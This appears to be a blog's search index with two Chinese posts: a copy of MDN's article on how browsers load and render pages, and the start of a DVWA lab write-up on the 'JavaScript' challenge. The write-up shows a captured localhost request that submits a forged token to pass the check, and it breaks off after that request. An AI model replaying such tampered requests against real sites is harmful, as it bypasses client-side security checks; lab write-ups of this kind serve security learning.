<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浏览器做了什么</title>
    <link href="/2022/07/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <url>/2022/07/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在我们输入网址按下回车后发生了什么？这篇文章解释地深浅适中，我愿意称浏览器为”www世界的窗户”，我们可以透过窗户，看到另一个世界的风景。</p></blockquote><h1 id="渲染页面：浏览器的工作原理"><a href="#渲染页面：浏览器的工作原理" class="headerlink" title="渲染页面：浏览器的工作原理"></a>渲染页面：浏览器的工作原理</h1><p>页面内容快速加载和流畅的交互是用户希望得到的 Web 体验，因此，开发者应力争实现这两个目标。</p><p>了解如何提升性能和感知性能，有助于了解浏览器的工作原理。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><a href="#%E6%A6%82%E8%BF%B0">概述</a></h2><p>快速响应的网站提供更好的用户体验。用户期待内容快速加载和交互流畅的 Web 体验。</p><p>等待资源加载时间和大部分情况下的浏览器单线程执行是影响 Web 性能的两大主要原因。</p><p>等待时间是需要去克服来让浏览器快速加载资源的主要威胁。为了实现快速加载，开发者的目标就是尽可能快的发送请求的信息，至少看起来相当快。网络等待时间是在链路上传送二进制到电脑端所消耗的链路传输时间。Web 性能优化需要做的就是尽可能快的使页面加载完成。</p><p>大部分情况下，浏览器是单线程执行的。为了有流畅的交互，开发者的目标是确保网站从流畅的页面滚动到点击响应的交互性能。渲染时间是关键要素，确保主线程可以完成所有给它的任务并且仍然一直可以处理用户的交互。通过了解浏览器单线程的本质与最小化主线程的责任可以优化 Web 性能，来确保渲染的流畅和交互响应的及时。</p><h2 id="导航"><a href="#导航" class="headerlink" title="导航"></a><a href="#%E5%AF%BC%E8%88%AA">导航</a></h2><p>_导航_是加载 web 页面的第一步。它发生在以下情形：用户通过在地址栏输入一个 URL、点击一个链接、提交表单或者是其他的行为。</p><p>Web 性能优化的目标之一就是缩短导航完成所花费的时间，在理想情况下，它通常不会花费太多的时间，但是等待时间和带宽会导致它的延时。</p><h3 id="DNS-查询"><a href="#DNS-查询" class="headerlink" title="DNS 查询"></a><a href="#dns_%E6%9F%A5%E8%AF%A2">DNS 查询</a></h3><p>对于一个 web 页面来说导航的第一步是要去寻找页面资源的位置。如果导航到 <code>https://example.com</code>，HTML 页面被定位到 IP 地址为 <code>93.184.216.34</code> 的服务器。如果以前没有访问过这个网站，就需要进行 DNS 查询。</p><p>浏览器向<strong>名称服务器</strong>发起 DNS 查询请求，最终得到一个 IP 地址。第一次请求之后，这个 IP 地址可能会被缓存一段时间，这样可以通过从缓存里面检索 IP 地址而不是再通过名称服务器进行查询来加速后续的请求。</p><p>通过主机名加载一个页面通常仅需要一次 DNS 查询。但是，对于页面指向的不同的主机名，则需要多次 DNS 查询。如果字体（fonts）、图像（images）、脚本（scripts）、广告（ads）和网站统计（metrics）都有不同的主机名，则需要对每一个主机名进行 DNS 查询。</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work/latency.jpg" alt="移动终端的请求先发送到基站，接着发送到运营商的中心计算机，然后再发送到互联网"></p><p>DNS 查询可能存在性能问题，特别是对于移动网络。当一个用户使用了移动网络，每一个 DNS 查询必须从手机发送到基站，然后到达一个认证的 DNS 服务器。手机、信号塔、名称服务器之间的距离可能是一个大的时间等待。</p><h3 id="TCP-握手"><a href="#TCP-握手" class="headerlink" title="TCP 握手"></a><a href="#tcp_%E6%8F%A1%E6%89%8B">TCP 握手</a></h3><p>一旦获取到服务器 IP 地址，浏览器就会通过 <a href="https://developer.mozilla.org/en-US/docs/Glossary/TCP_handshake">TCP“三次握手” (en-US)</a>与服务器建立连接。这个机制的是用来让两端尝试进行通信——在浏览器和服务器通过上层协议 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTPS">HTTPS</a> 发送数据之前，可以协商网络 TCP 套接字连接的一些参数。</p><p>TCP 的“三次握手”技术经常被称为“SYN-SYN-ACK”——更确切的说是 SYN、SYN-ACK、ACK——因为通过 TCP 首先发送了三个消息进行协商，然后在两台电脑之间开始一个 TCP 会话。是的，这意味着终端与每台服务器之间还要来回发送三条消息，而请求尚未发出。</p><h3 id="TLS-协商"><a href="#TLS-协商" class="headerlink" title="TLS 协商"></a><a href="#tls_%E5%8D%8F%E5%95%86">TLS 协商</a></h3><p>为了在 HTTPS 上建立安全连接，另一种握手是必须的。更确切的说是 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/TLS">TLS</a> 协商，它决定了什么密码将会被用来加密通信，验证服务器，在进行真实的数据传输之前建立安全连接。在发送真正的请求内容之前还需要三次往返服务器。</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work/ssl.jpg" alt="DNS 查询、TCP 握手和 TLS 5 步握手（包括服务器和客户端之间的 clienthello、serverhello 以及证书、clientkey 和完成消息）。"></p><p>虽然建立安全连接对增加了加载页面的等待时间，对于建立一个安全的连接来说，以增加等待时间为代价是值得的，因为在浏览器和 web 服务器之间传输的数据不可以被第三方解密。</p><p>经过 8 次往返，浏览器终于可以发出请求。</p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a><a href="#%E5%93%8D%E5%BA%94">响应</a></h2><p>一旦我们建立了到 web 服务器的连接，浏览器就代表用户发送一个初始的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">HTTP <code>GET</code> 请求</a>，对于网站来说，这个请求通常是一个 HTML 文件。一旦服务器收到请求，它将使用相关的响应头和 HTML 的内容进行回复。</p><p>htmlCopy to Clipboard</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>My simple page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;styles.css&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;myscript.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;heading&quot;</span>&gt;</span>My Page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>A paragraph with a <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://example.com/about&quot;</span>&gt;</span>link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;myimage.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image description&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;anotherscript.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>初始请求的响应包含所接收数据的第一个字节。<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Time_to_first_byte">Time to First Byte</a>（TTFB）是用户通过点击链接进行请求与收到第一个 HTML 数据包之间的时间。第一个内容分块通常是 14KB 的数据。</p><p>上面的例子中，这个请求肯定是小于 14KB 的，但是直到浏览器在解析阶段遇到链接时才会去请求链接的资源，下面有进行描述。</p><h3 id="TCP-慢启动-14KB-规则"><a href="#TCP-慢启动-14KB-规则" class="headerlink" title="TCP 慢启动 / 14KB 规则"></a><a href="#tcp_%E6%85%A2%E5%90%AF%E5%8A%A8_14kb_%E8%A7%84%E5%88%99">TCP 慢启动 / 14KB 规则</a></h3><p>第一个响应数据包是 14KB 大小的。这是慢启动的一部分，慢启动是一种均衡网络连接速度的算法。慢启动逐渐增加发送数据的数量直到达到网络的最大带宽。</p><p>在 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/TCP_slow_start">TCP 慢启动</a> 中，在收到初始包之后，服务器会将下一个数据包的大小加倍到大约 28KB。后续的数据包依次是前一个包大小的二倍直到达到预定的阈值，或者遇到拥塞。</p><p>如果您听说过初始页面加载的 14KB 规则，TCP 慢启动就是初始响应为 14KB 的原因，也是为什么 web 性能优化需要将此初始 14KB 响应作为优化重点的原因。TCP 慢启动逐渐建立适合网络能力的传输速度，以避免拥塞。</p><h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a><a href="#%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">拥塞控制</a></h3><p>当服务器用 TCP 数据包来发送数据时，客户端通过返回确认帧来确认传输。由于硬件和网络条件，连接的容量是有限的。如果服务器太快地发送太多的包，它们可能会被丢弃。这意味着，将不会有确认帧的返回。服务器把它们当做确认帧丢失。拥塞控制算法使用这个发送包和确认帧流来确定发送速率。</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a><a href="#%E8%A7%A3%E6%9E%90">解析</a></h2><p>一旦浏览器收到数据的第一块，它就可以开始解析收到的信息。<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Parse">“解析”</a>是浏览器将通过网络接收的数据转换为 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/DOM">DOM</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSSOM">CSSOM</a> 的步骤，通过渲染器把 DOM 和 CSSOM 在屏幕上绘制成页面。</p><p>DOM 是浏览器标记的内部表示。DOM 也是被暴露的，可以通过 JavaScript 中的各种 API 进行 DOM 操作。</p><p>即使请求页面的 HTML 大于初始的 14KB 数据包，浏览器也将开始解析并尝试根据其拥有的数据进行渲染。这就是为什么在前 14KB 中包含浏览器开始渲染页面所需的所有内容，或者至少包含页面模板（第一次渲染所需的 CSS 和 HTML）对于 web 性能优化来说是重要的。但是在渲染到屏幕上面之前，HTML、CSS、JavaScript 必须被解析完成。</p><h3 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a><a href="#%E6%9E%84%E5%BB%BA_dom_%E6%A0%91">构建 DOM 树</a></h3><p>我们描述五个步骤在<a href="https://developer.mozilla.org/zh-CN/docs/Web/Performance/Critical_rendering_path">关键渲染路径</a>这篇文章中。</p><p>第一步是处理 HTML 标记并构造 DOM 树。HTML 解析涉及到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DOMTokenList">tokenization</a> 和树的构造。HTML 标记包括开始和结束标记，以及属性名和值。如果文档格式良好，则解析它会简单而快速。解析器将标记化的输入解析到文档中，构建文档树。</p><p>DOM 树描述了文档的内容。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/html"><code>&lt;html&gt;</code></a> 元素是第一个标签也是文档树的根节点。树反映了不同标记之间的关系和层次结构。嵌套在其他标记中的标记是子节点。DOM 节点的数量越多，构建 DOM 树所需的时间就越长。</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work/dom.gif" alt="我们示例代码的 DOM 树，显示了所有节点（包括文本节点）。"></p><p>当解析器发现非阻塞资源，例如一张图片，浏览器会请求这些资源并且继续解析。当遇到一个 CSS 文件时，解析也可以继续进行，但是对于 <code>&lt;script&gt;</code> 标签（特别是没有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function"><code>async</code></a> 或者 <code>defer</code> 属性的）会阻塞渲染并停止 HTML 的解析。尽管浏览器的预加载扫描器加速了这个过程，但过多的脚本仍然是一个重要的瓶颈。</p><h3 id="预加载扫描器"><a href="#预加载扫描器" class="headerlink" title="预加载扫描器"></a><a href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E6%89%AB%E6%8F%8F%E5%99%A8">预加载扫描器</a></h3><p>浏览器构建 DOM 树时，这个过程占用了主线程。当这种情况发生时，预加载扫描仪将解析可用的内容并请求高优先级资源，如 CSS、JavaScript 和 web 字体。多亏了预加载扫描器，我们不必等到解析器找到对外部资源的引用来请求它。它将在后台检索资源，以便在主 HTML 解析器到达请求的资源时，它们可能已经在运行，或者已经被下载。预加载扫描仪提供的优化减少了阻塞。</p><p>htmlCopy to Clipboard</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;styles.css&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;myscript.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;myimage.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image description&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;anotherscript.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>在这个例子中，当主线程在解析 HTML 和 CSS 时，预加载扫描器将找到脚本和图像，并开始下载它们。为了确保脚本不会阻塞进程，当 JavaScript 解析和执行顺序不重要时，可以添加 <code>async</code> 属性或 <code>defer</code> 属性。</p><p>等待获取 CSS 不会阻塞 HTML 的解析或者下载，但是它确实会阻塞 JavaScript，因为 JavaScript 经常用于查询元素的 CSS 属性。</p><h3 id="构建-CSSOM-树"><a href="#构建-CSSOM-树" class="headerlink" title="构建 CSSOM 树"></a><a href="#%E6%9E%84%E5%BB%BA_cssom_%E6%A0%91">构建 CSSOM 树</a></h3><p>第二步是处理 CSS 并构建 CSSOM 树。CSS 对象模型和 DOM 是相似的。DOM 和 CSSOM 是两棵树。它们是独立的数据结构。浏览器将 CSS 规则转换为可以理解和使用的样式映射。浏览器遍历 CSS 中的每个规则集，根据 CSS 选择器创建具有父、子和兄弟关系的节点树。</p><p>与 HTML 一样，浏览器需要将接收到的 CSS 规则转换为可以使用的内容。因此，它重复了 HTML 到对象的过程，但对于 CSS。</p><p>CSSOM 树包括来自用户代理样式表的样式。浏览器从适用于节点的最通用规则开始，并通过应用更具体的规则递归地优化计算的样式。换句话说，它级联属性值。</p><p>构建 CSSOM 非常非常快，并且在当前的开发工具中没有以独特的颜色显示。相反，开发人员工具中的“重新计算样式”显示解析 CSS、构建 CSSOM 树和递归计算计算样式所需的总时间。在 web 性能优化方面，它是可轻易实现的，因为创建 CSSOM 的总时间通常小于一次 DNS 查询所需的时间。</p><h3 id="其他过程"><a href="#其他过程" class="headerlink" title="其他过程"></a><a href="#%E5%85%B6%E4%BB%96%E8%BF%87%E7%A8%8B">其他过程</a></h3><h4 id="JavaScript-编译"><a href="#JavaScript-编译" class="headerlink" title="JavaScript 编译"></a>JavaScript 编译</h4><p>当 CSS 被解析并创建 CSSOM 时，其他资源，包括 JavaScript 文件正在下载（借助预加载扫描器）。JavaScript 被解释、编译、解析和执行。脚本被解析为抽象语法树。一些浏览器引擎使用<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91">抽象语法树</a>并将其传递到解释器中，输出在主线程上执行的字节码。这就是所谓的 JavaScript 编译。</p><h4 id="构建辅助功能树"><a href="#构建辅助功能树" class="headerlink" title="构建辅助功能树"></a>构建辅助功能树</h4><p>浏览器还构建辅助设备用于分析和解释内容的辅助功能[accessibility]树。无障碍对象模型（AOM）类似于 DOM 的语义版本。当 DOM 更新时，浏览器会更新辅助功能树。辅助技术本身无法修改无障碍树。</p><p>在构建 AOM 之前，屏幕阅读器[screen readers (en-US)]无法访问内容。</p><h2 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a><a href="#%E6%B8%B2%E6%9F%93">渲染</a></h2><p>渲染步骤包括样式、布局、绘制，在某些情况下还包括合成。在解析步骤中创建的 CSSOM 树和 DOM 树组合成一个 Render 树，然后用于计算每个可见元素的布局，然后将其绘制到屏幕上。在某些情况下，可以将内容提升到它们自己的层并进行合成，通过在 GPU 而不是 CPU 上绘制屏幕的一部分来提高性能，从而释放主线程。</p><h3 id="Style"><a href="#Style" class="headerlink" title="Style"></a><a href="#style">Style</a></h3><p>第三步是将 DOM 和 CSSOM 组合成一个 Render 树，计算样式树或渲染树从 DOM 树的根开始构建，遍历每个可见节点。</p><p>像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/head"><code>&lt;head&gt;</code></a> 和它的子节点以及任何具有 <code>display: none</code> 样式的结点，例如 <code>script &#123; display: none; &#125;</code>（在 user agent stylesheets 可以看到这个样式）这些标签将不会显示，也就是它们不会出现在 Render 树上。具有 <code>visibility: hidden</code> 的节点会出现在 Render 树上，因为它们会占用空间。由于我们没有给出任何指令来覆盖用户代理的默认值，因此上面代码示例中的 <code>script</code> 节点将不会包含在 Render 树中。</p><p>每个可见节点都应用了其 CSSOM 规则。Render 树保存所有具有内容和计算样式的可见节点——将所有相关样式匹配到 DOM 树中的每个可见节点，并根据 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Cascade">CSS 级联</a>确定每个节点的计算样式。</p><h3 id="Layout"><a href="#Layout" class="headerlink" title="Layout"></a><a href="#layout">Layout</a></h3><p>第四步是在渲染树上运行布局以计算每个节点的几何体。布局是确定呈现树中所有节点的宽度、高度和位置，以及确定页面上每个对象的大小和位置的过程。回流是对页面的任何部分或整个文档的任何后续大小和位置的确定。</p><p>构建渲染树后，开始布局。渲染树标识显示哪些节点（即使不可见）及其计算样式，但不标识每个节点的尺寸或位置。为了确定每个对象的确切大小和位置，浏览器从渲染树的根开始遍历它。</p><p>在网页上，大多数东西都是一个盒子。不同的设备和不同的桌面意味着无限数量的不同的视区大小。在此阶段，考虑到视区大小，浏览器将确定屏幕上所有不同框的尺寸。以视区的大小为基础，布局通常从 body 开始，用每个元素的框模型属性排列所有 body 的子孙元素的尺寸，为不知道其尺寸的替换元素（例如图像）提供占位符空间。</p><p>第一次确定节点的大小和位置称为布局。随后对节点大小和位置的重新计算称为回流。在我们的示例中，假设初始布局发生在返回图像之前。由于我们没有声明图像的大小，因此一旦知道图像大小，就会有回流。</p><h3 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a><a href="#%E7%BB%98%E5%88%B6">绘制</a></h3><p>最后一步是将各个节点绘制到屏幕上，第一次出现的节点称为 [first meaningful paint (en-US)]。在绘制或光栅化阶段，浏览器将在布局阶段计算的每个框转换为屏幕上的实际像素。绘画包括将元素的每个可视部分绘制到屏幕上，包括文本、颜色、边框、阴影和替换的元素（如按钮和图像）。浏览器需要非常快地完成这项工作。</p><p>为了确保平滑滚动和动画，占据主线程的所有内容，包括计算样式，以及回流和绘制，必须让浏览器在 16.67 毫秒内完成。在 2048x1536 分辨率的 iPad 上，有超过 314.5 万像素将被绘制到屏幕上。那是很多像素需要快速绘制。为了确保重绘的速度比初始绘制的速度更快，屏幕上的绘图通常被分解成数层。如果发生这种情况，则需要进行合成。</p><p>绘制可以将布局树中的元素分解为多个层。将内容提升到 GPU 上的层（而不是 CPU 上的主线程）可以提高绘制和重新绘制性能。有一些特定的属性和元素可以实例化一个层，包括 [<code>&lt;video&gt;</code>] 和 [<code>&lt;canvas&gt;</code>]，任何 CSS 属性为 [<code>opacity</code>]、3D [<code>transform</code>]、[<code>will-change</code>] 的元素，还有一些其他元素。这些节点将与子节点一起绘制到它们自己的层上，除非子节点由于上述一个（或多个）原因需要自己的层。</p><p>分层确实可以提高性能，但是它以内存管理为代价，因此不应作为 web 性能优化策略的一部分过度使用。</p><h3 id="Compositing"><a href="#Compositing" class="headerlink" title="Compositing"></a><a href="#compositing">Compositing</a></h3><p>当文档的各个部分以不同的层绘制，相互重叠时，必须进行合成，以确保它们以正确的顺序绘制到屏幕上，并正确显示内容。</p><p>当页面继续加载资源时，可能会发生回流（回想一下我们迟到的示例图像），回流会触发重新绘制和重新组合。如果我们定义了图像的大小，就不需要重新绘制，只需要重新绘制需要重新绘制的层，并在必要时进行合成。但我们没有包括图像大小！从服务器获取图像后，渲染过程将返回到布局步骤并从那里重新开始。</p><h2 id="交互"><a href="#交互" class="headerlink" title="交互"></a><a href="#%E4%BA%A4%E4%BA%92">交互</a></h2><p>一旦主线程绘制页面完成，你会认为我们已经“准备好了”，但事实并非如此。如果加载包含 JavaScript（并且延迟到 [<code>onload</code>]事件激发后执行），则主线程可能很忙，无法用于滚动、触摸和其他交互。</p><p>[Time to Interactive (en-US)]是测量从第一个请求导致 DNS 查询和 SSL 连接到页面可交互时所用的时间——可交互是 [First Contentful Paint (en-US)]之后的时间点，页面在 50ms 内响应用户的交互。如果主线程正在解析、编译和执行 JavaScript，则它不可用，因此无法及时（小于 50ms）响应用户交互。</p><p>在我们的示例中，可能图像加载很快，但 <code>anotherscript.js</code> 文件可能是 2MB，而且用户的网络连接很慢。在这种情况下，用户可以非常快地看到页面，但是在下载、解析和执行脚本之前，就无法滚动。这不是一个好的用户体验。避免占用主线程，如下面的网页测试示例所示：</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work/visa_network.png" alt="通过快速连接，主线程被 JavaScript 文件下载、解析和执行占用"></p><p>在本例中，DOM 内容加载过程花费了超过 1.5 秒的时间，主线程在这段时间内完全被占用，对单击事件或屏幕点击没有响应。</p><h2 id="参见"><a href="#参见" class="headerlink" title="参见"></a><a href="#%E5%8F%82%E8%A7%81">参见</a></h2><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Performance">Web 性能</a></li></ul><h3 id="Found-a-content-problem-with-this-page"><a href="#Found-a-content-problem-with-this-page" class="headerlink" title="Found a content problem with this page?"></a>Found a content problem with this page?</h3><ul><li><a href="https://github.com/mdn/translated-content/edit/main/files/zh-cn/web/performance/how_browsers_work/index.md" title="This will take you to GitHub, where you&#39;ll need to sign in first.">Edit the page on GitHub</a>.</li><li><a href="https://github.com/mdn/translated-content/issues/new?template=page-report-zh-cn.yml&mdn-url=https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work&metadata=%3C!--+Do+not+make+changes+below+this+line+--%3E%0A%3Cdetails%3E%0A%3Csummary%3EPage+report+details%3C/summary%3E%0A%0A*+Folder:+%60zh-cn/web/performance/how_browsers_work%60%0A*+MDN+URL:+https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work%0A*+GitHub+URL:+https://github.com/mdn/translated-content/blob/main/files/zh-cn/web/performance/how_browsers_work/index.md%0A*+Last+commit:+https://github.com/mdn/translated-content/commit/58d7a73bf10b2e018d5227670ff6c7ccb08d327a%0A*+Document+last+modified:+2023-08-02T22:56:46.000Z%0A%0A%3C/details%3E" title="This will take you to GitHub to file a new issue.">Report the content issue</a>.</li><li><a href="https://github.com/mdn/translated-content/blob/main/files/zh-cn/web/performance/how_browsers_work/index.md?plain=1" title="Folder: zh-cn/web/performance/how_browsers_work (Opens in a new tab)">View the source on GitHub</a>.</li></ul><p>Want to get more involved? <a href="https://github.com/mdn/content/blob/main/CONTRIBUTING.md" title="This will take you to our contribution guidelines on GitHub.">Learn how to contribute</a>.</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>dns</tag>
      
      <tag>http</tag>
      
      <tag>tcp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-JS-attack</title>
    <link href="/2022/06/07/dvwa-JS-attack/"/>
    <url>/2022/06/07/dvwa-JS-attack/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这一章主要是介绍了网页中Javascript在浏览器中是怎样加载执行的。一般来讲，浏览器先解析HTML,CSS，Javascript，然后再渲染页面。Javascript脚本一般在网页中与用户交互行为有关。关于浏览器做了什么，这里比较详细，<a href="/2022/07/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/" title="浏览器做了什么">浏览器做了什么</a></p></blockquote><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/07/dvwa-JS-attack/1692515916862.png" alt="1692515916862"></p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/javascript/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>65<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/javascript/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1ekmlj5hkmfpg44br6ilefo6s2; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts"><span class="hljs-attr">token</span><span class="hljs-operator">=</span><span class="hljs-number">8</span>b479aefbd90795395b3e7089ae0dc09<span class="hljs-variable">&amp;phrase</span>=success<span class="hljs-variable">&amp;send</span>=Submit</span><br></code></pre></td></tr></table></figure><h2 id="源码"><a href="#源码" class="headerlink" 